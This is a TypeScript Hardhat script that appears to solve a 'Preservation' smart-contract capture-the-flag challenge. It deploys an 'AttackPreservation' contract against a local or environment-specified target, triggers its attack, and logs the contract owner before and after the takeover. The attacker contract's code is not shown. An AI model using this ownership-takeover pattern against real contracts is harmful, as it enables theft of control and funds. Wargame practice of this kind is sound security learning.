import {ethers} from "hardhat"
import dotenv from 'dotenv'
import type {Preservation} from "../typechain-types";

dotenv.config()

async function main() {
    const isLocalTest = false

    const [, other] = await ethers.getSigners()
    let target: Preservation
    if (isLocalTest) {
        const libraryContract1 = await ethers.deployContract('LibraryContract', other)
        const libraryContract2 = await ethers.deployContract('LibraryContract', other)
        target = await ethers.deployContract('Preservation', [libraryContract1.target, libraryContract2.target], other)
    } else {
        target = await ethers.getContractAt('Preservation', process.env.TARGET_ADDRESS_17!)
    }

    const attacker = await ethers.deployContract('AttackPreservation', [target.target])
    console.log(`owner before attack: ${await target.owner()}`)
    // attack
    await attacker.attack({gasLimit: 100000})
    console.log(`owner after attack: ${await target.owner()}`)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
